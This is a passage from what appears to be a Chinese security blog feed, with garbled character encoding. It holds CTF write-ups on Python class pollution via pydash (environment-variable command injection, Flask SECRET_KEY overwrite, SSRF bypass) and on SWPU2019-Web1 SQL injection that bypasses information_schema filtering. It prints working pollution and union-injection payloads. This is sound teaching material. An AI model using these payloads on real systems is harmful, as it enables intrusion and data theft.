python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.__class__.__init__.__globals__[<span class="string">&#x27;subprocess&#x27;</span>].os.environ.__setitem__(<span class="string">&#x27;COMSPEC&#x27;</span>, <span class="string">&quot;cmd /c calc&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="åˆå¹¶å‡½æ•°çš„çœŸå®ä¾‹å­â€”Pydash"><a href="#åˆå¹¶å‡½æ•°çš„çœŸå®ä¾‹å­â€”Pydash" class="headerlink" title="åˆå¹¶å‡½æ•°çš„çœŸå®ä¾‹å­â€”Pydash"></a>åˆå¹¶å‡½æ•°çš„çœŸå®ä¾‹å­â€”Pydash</h2><blockquote><p>Pydashçš„set_()å’Œset_with()å‡½æ•°æ˜¯é€’å½’åˆå¹¶å‡½æ•°çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥æ±¡æŸ“å±æ€§ã€‚</p><p>Pydash å‡½æ•°ä½¿ç”¨ç‚¹ç¬¦å·è®¿é—®å±æ€§å’Œé¡¹ç›®è€Œä¸æ˜¯ JSON æ ¼å¼</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotAccessibleClass</span>: <span class="keyword">pass</span></span><br><span class="line">not_accessible_variable = <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line"></span><br><span class="line">pydash.set_(User(), <span class="string">&#x27;__class__.__init__.__globals__.not_accessible_variable&#x27;</span>,<span class="string">&#x27;Polluted variable&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(not_accessible_variable)</span><br><span class="line"></span><br><span class="line">pydash.set_(User(), <span class="string">&#x27;__class__.__init__.__globals__.NotAccessibleClass.__qualname__&#x27;</span>,<span class="string">&#x27;PollutedClass&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(NotAccessibleClass)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&gt; Polluted variable</span></span><br><span class="line"><span class="comment">#&gt; &lt;class &#x27;__main__.PollutedClass&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="flaskç›¸å…³"><a href="#flaskç›¸å…³" class="headerlink" title="flaskç›¸å…³"></a>flaskç›¸å…³</h2><h3 id="secret-keyæ±¡æŸ“"><a href="#secret-keyæ±¡æŸ“" class="headerlink" title="secret_keyæ±¡æŸ“"></a>secret_keyæ±¡æŸ“</h3><p>ä¹‹å‰åœ¨å®¢æˆ·ç«¯sessionçš„é—®é¢˜ä¸­æ¥è§¦è¿‡å¯¹flask sessionçš„ä¼ªé€ , secret_keyå°±æ˜¯ä¸€ä¸ªå¿…è¦çš„æ¡ä»¶</p><p>å¯ä»¥é€šè¿‡è¦†ç›–åŸæœ‰çš„secret_keyå®ç°ä»»æ„sessionä¼ªé€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span> :<span class="string">&quot;Polluted&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><h3 id="TSCTF-J2023-Python-Not-Node"><a href="#TSCTF-J2023-Python-Not-Node" class="headerlink" title="TSCTF-J2023 Python Not Node"></a>TSCTF-J2023 Python Not Node</h3><p>æ‰¾ä¸åˆ°å“ªä¸ªé¶åœºæœ‰è¿™é¢˜, ç®€å•çœ‹ä¸€ä¸‹æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">os.environ[<span class="string">&#x27;cmd&#x27;</span>] = <span class="string">&quot;ping -c 10 www.baidu.com&quot;</span> </span><br><span class="line">black_list = [<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Userinfo</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): </span><br><span class="line">       <span class="keyword">pass</span></span><br><span class="line">       </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comexec</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">test_ping</span>(<span class="params">self</span>):</span><br><span class="line">       cmd = os.getenv(<span class="string">&#x27;cmd&#x27;</span>) </span><br><span class="line">       os.system(cmd)</span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/define&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">define</span>():</span><br><span class="line">   <span class="keyword">if</span> request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(request.args)</span><br><span class="line">           usname = request.args[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">           info = request.args[<span class="string">&#x27;info&#x27;</span>]</span><br><span class="line">           origin_user = request.args[<span class="string">&#x27;origin_user&#x27;</span>]</span><br><span class="line">           user = &#123;usname: info&#125;</span><br><span class="line">           <span class="built_in">print</span>(<span class="built_in">type</span>(user))</span><br><span class="line">           pydash.set_with(Userinfo(), origin_user, user, <span class="keyword">lambda</span>: &#123;&#125;) </span><br><span class="line">           result = comexec().test_ping()</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;USER READY,JUST INSERT YOUR SEARCH RESULT&quot;</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;NOPE&quot;</span></span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">       urls = request.args[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">           <span class="keyword">if</span> i <span class="keyword">in</span> urls:</span><br><span class="line">               <span class="keyword">return</span> <span class="string">&quot;HACKER URL!&quot;</span></span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">           info = urllib.request.urlopen(urls).read().decode(<span class="string">&#x27;utf-8&#x27;</span>) </span><br><span class="line">           <span class="keyword">return</span> info</span><br><span class="line">       <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">           <span class="built_in">print</span>(e)</span><br><span class="line">               <span class="keyword">return</span> <span class="string">&quot;error&quot;</span> </span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;Method error&quot;</span></span><br><span class="line">       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;&lt;html&gt; Welcome to this Challenge &lt;/html&gt; &lt;script&gt;alert(&#x27;focus on the </span></span><br><span class="line"><span class="string">source code&#x27;)&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   app.run(debug=<span class="literal">True</span>, port=<span class="number">37333</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªflaskå®ç°çš„ç¨‹åº</p><p>å…¶ä¸­:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pydash.set_with(Userinfo(), origin_user, user, <span class="keyword">lambda</span>: &#123;&#125;)</span><br><span class="line">result = comexec().test_ping()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comexec</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">test_ping</span>(<span class="params">self</span>):</span><br><span class="line">       cmd = os.getenv(<span class="string">&#x27;cmd&#x27;</span>) </span><br><span class="line">       os.system(cmd)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†pydashå¹¶ä¸”ä¹‹åæ‰§è¡Œäº†ç¯å¢ƒå˜é‡ä¸­cmdå­˜å‚¨çš„pingå‘½ä»¤</p><p>å› æ­¤å°±å¯ä»¥é€šè¿‡pydashæ¥æ±¡æŸ“ç¯å¢ƒå˜é‡ åˆ°è¾¾å‘½ä»¤æ³¨å…¥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">origin_user=__class__.__init__.__globals__.os.environ&amp;info=Polluted</span><br></pre></td></tr></table></figure><p>è‡³äºè¿™é‡Œçš„ssrf, æ¬è¿ä¸€ä¸‹å¤§ä½¬çš„è¯</p><blockquote><ul><li><p><strong>SSRF</strong></p><ul><li><p>å¸¸è§çš„æ–¹å¼æ˜¯8è¿›åˆ¶ã€16è¿›åˆ¶ã€302è·³è½¬ç­‰ç»•è¿‡ï¼Œè¿™äº›éƒ½è¢«å±è”½äº†ï¼Œæœ€åé¢˜è§£è¯´æ˜¯ç®€å•çš„å¤§å°å†™ç»•è¿‡ã€‚</p><p>ä½†æ˜¯åšé¢˜çš„æ—¶å€™æ²¡æƒ³åˆ°ï¼Œæ‰€ä»¥ä½¿ç”¨çš„æ˜¯<strong>localtest.me</strong>åŸŸåç»•è¿‡ï¼Œè¿™æ˜¯å¤§ä½¬ä¹°ä¸‹çš„åŸŸåï¼Œè®¿é—®æ—¶å…¶å®æ˜¯é‡å®šå‘åˆ°æœ¬æœºï¼Œè¿™æ ·çš„åŸŸåè¿˜æœ‰å¾ˆå¤šã€‚</p></li><li><p>è¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯éœ€è¦urlç¼–ç é¿å…å‚æ•°çš„æ··æ·†è§£æï¼Œå› ä¸ºè¿™é‡ŒSSRFçš„åŸŸåä¹Ÿéœ€è¦æ·»åŠ å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œurlç¼–ç ã€‚</p></li></ul></li></ul></blockquote><p>å‚è€ƒ:</p><p><a href="https://xz.aliyun.com/t/13072">https://xz.aliyun.com/t/13072</a></p><p><a href="https://note.silente.dev/Web/keypoint/python-proto/">https://note.silente.dev/Web/keypoint/python-proto/</a></p><p><a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python-åŸé“¾æ±¡æŸ“-ç±»æ±¡æŸ“&quot;&gt;&lt;a href=&quot;#Python-åŸé“¾æ±¡æŸ“-ç±»æ±¡æŸ“&quot; class=&quot;headerlink&quot; title=&quot;Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)&quot;&gt;&lt;/a&gt;Python åŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)&lt;/h1&gt;&lt;p&gt;ä¸JavaScriptåŸå‹é“¾æ±¡æŸ“</summary>
      
    
    
    
    
    <category term="PythonåŸé“¾æ±¡æŸ“(ç±»æ±¡æŸ“)" scheme="http://example.com/tags/Python%E5%8E%9F%E9%93%BE%E6%B1%A1%E6%9F%93-%E7%B1%BB%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019-Web1</title>
    <link href="http://example.com/2024/02/26/SWPU2019-Web1/"/>
    <id>http://example.com/2024/02/26/SWPU2019-Web1/</id>
    <published>2024-02-26T13:38:46.000Z</published>
    <updated>2024-02-26T15:47:54.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="SWPU2019-Web1"></a>SWPU2019-Web1</h1><p>åœ¨æ³¨å†Œç™»å½•åå¹¿å‘Šç”³è¯·å¤„ å¹¿å‘Šåå­—æ®µå­˜åœ¨æ³¨å…¥</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226214413930.png" alt="image-20240226214413930"></p><p>ç¦äº†or, å¯ä»¥ä½¿ç”¨group byæµ‹è¯•å‡ºæŸ¥è¯¢å­—æ®µæ•°</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,version(),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226214507781.png" alt="image-20240226214507781"></p><p>è¿™é‡Œçš„éš¾ç‚¹åœ¨äºç¦äº†information_schema</p><p>å…³äºæ— è¡¨å,åˆ—åæ³¨å…¥:</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">https://www.cnblogs.com/20175211lyz/p/12358725.html</a></p><p>è¿™é‡Œä½¿ç”¨<strong>innodb_table_stats</strong>è¿™å¼ è¡¨æ¥å‘ç°è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=-1&#x27;/**/union/**/select/**/1,group_concat(table_name),database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/&#x27;1&#x27;=&#x27;1&amp;content=a&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226220242765.png" alt="image-20240226220242765"></p><p>ä¹‹åæ˜¯æ— åˆ—åæ³¨å…¥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(`3`)from(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22&amp;content=a&amp;ac=add</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226225432773.png" alt="image-20240226225432773"></p><p><strong>æ€»ç»“</strong></p><h2 id="mysqlç»•è¿‡information-schema-æ— è¡¨ååˆ—åæ³¨å…¥"><a href="#mysqlç»•è¿‡information-schema-æ— è¡¨ååˆ—åæ³¨å…¥" class="headerlink" title="mysqlç»•è¿‡information_schema, æ— è¡¨ååˆ—åæ³¨å…¥"></a>mysqlç»•è¿‡information_schema, æ— è¡¨ååˆ—åæ³¨å…¥</h2><h3 id="æ— è¡¨å"><a href="#æ— è¡¨å" class="headerlink" title="æ— è¡¨å:"></a>æ— è¡¨å:</h3><h4 id="InnoDBå¼•æ“"><a href="#InnoDBå¼•æ“" class="headerlink" title="InnoDBå¼•æ“"></a>InnoDBå¼•æ“</h4><blockquote><p>ä»MySQL 5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MySQL  5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼ŒInnoDbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(database_name) <span class="keyword">from</span> mysql.innodb_table_stats;</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><h4 id="sysåº“"><a href="#sysåº“" class="headerlink" title="sysåº“"></a>sysåº“</h4><blockquote><p>åœ¨MySQL 5.7ä¸­ï¼Œæ–°å¢äº†sysç³»ç»Ÿæ•°æ®åº“ï¼Œé€šè¿‡è¿™ä¸ªåº“å¯ä»¥å¿«é€Ÿåœ°äº†è§£ç³»ç»Ÿçš„å…ƒæ•°æ®ä¿¡æ¯ã€‚sysåº“æ˜¯é€šè¿‡è§†å›¾çš„å½¢å¼æŠŠinformation_schemaå’Œperformance_schemaç»“åˆèµ·æ¥ï¼ŒæŸ¥è¯¢å‡ºæ›´åŠ ä»¤äººå®¹æ˜“ç†è§£çš„æ•°æ®ã€‚</p></blockquote><h5 id="sys-schema-auto-increment-columnsæŸ¥è¯¢å«æœ‰è‡ªå¢idçš„è¡¨"><a href="#sys-schema-auto-increment-columnsæŸ¥è¯¢å«æœ‰è‡ªå¢idçš„è¡¨" class="headerlink" title="sys.schema_auto_increment_columnsæŸ¥è¯¢å«æœ‰è‡ªå¢idçš„è¡¨"></a>sys.schema_auto_increment_columnsæŸ¥è¯¢å«æœ‰è‡ªå¢idçš„è¡¨</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h5 id="schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer"></a>schema_table_statistics_with_buffer</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h5 id="x-schema-table-statistics-with-buffer"><a href="#x-schema-table-statistics-with-buffer" class="headerlink" title="x$schema_table_statistics_with_buffer"></a>x$schema_table_statistics_with_buffer</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h3 id="æ— åˆ—å"><a href="#æ— åˆ—å" class="headerlink" title="æ— åˆ—å"></a>æ— åˆ—å</h3><h4 id="å­æŸ¥è¯¢"><a href="#å­æŸ¥è¯¢" class="headerlink" title="å­æŸ¥è¯¢"></a>å­æŸ¥è¯¢</h4><p>åŸç†: å°†è¦æŸ¥è¯¢çš„è¡¨ä¸­çš„å†…å®¹å¯¼å…¥åˆ°é›¶æ—¶è¡¨ä¸­, å†ä»é›¶æ—¶è¡¨ä¸­é€šè¿‡è‡ªå®šä¹‰çš„åˆ—åæ¥æŸ¥è¯¢å‡ºæ•°æ®</p><p>ç¤ºä¾‹:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id,username,password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">100</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>å‡è®¾æ­¤æ—¶è¦æŸ¥è¯¢æ‰€æœ‰çš„username, å°±å¯ä»¥å¯¹ç¬¬äºŒä¸ªæŸ¥è¯¢çš„å­—æ®µè¿›è¡Œå­æŸ¥è¯¢å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232242851.png" alt="image-20240226232242851"></p><p>è¿™é‡Œunionåé¢ä¸€å…±æŸ¥è¯¢äº†ä¸‰æ¬¡:</p><p><strong>ç¬¬ä¸€æ¬¡</strong></p><p>ä¹Ÿå°±æ˜¯æœ€å†…å±‚çš„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232548082.png" alt="image-20240226232548082"></p><p><strong>ç¬¬äºŒæ¬¡</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br></pre></td></tr></table></figure><p>å°†ç¬¬ä¸€æ¬¡æŸ¥è¯¢å¾—åˆ°çš„è¡¨ä¸­<code>2</code>å­—æ®µçš„å†…å®¹(ä¹Ÿå°±æ˜¯åŸusersè¡¨ä¸­usernameçš„å†…å®¹)æŸ¥å‡ºæ¥å†ç”Ÿæˆä¸€å¼ é›¶æ—¶è¡¨</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232717346.png" alt="image-20240226232717346"></p><p><strong>ç¬¬ä¸‰æ¬¡</strong></p><p>åˆå¹¶</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232830882.png" alt="image-20240226232830882"></p><h4 id="join-using"><a href="#join-using" class="headerlink" title="join using"></a>join using</h4><p>è¿™é‡Œéœ€è¦æœ‰æŠ¥é”™å›æ˜¾</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b)<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>æŠ¥å‡ºç¬¬ä¸€ä¸ªåˆ—åä¸ºid</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b <span class="keyword">using</span>(id))<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>æŠ¥å‡ºç¬¬äºŒä¸ªåˆ—åä¸ºusername</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b <span class="keyword">using</span>(id,username))<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>ä»¥æ­¤ç±»æ¨</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226233801718.png" alt="image-20240226233801718"></p><h4 id="order-byç›²æ³¨"><a href="#order-byç›²æ³¨" class="headerlink" title="order 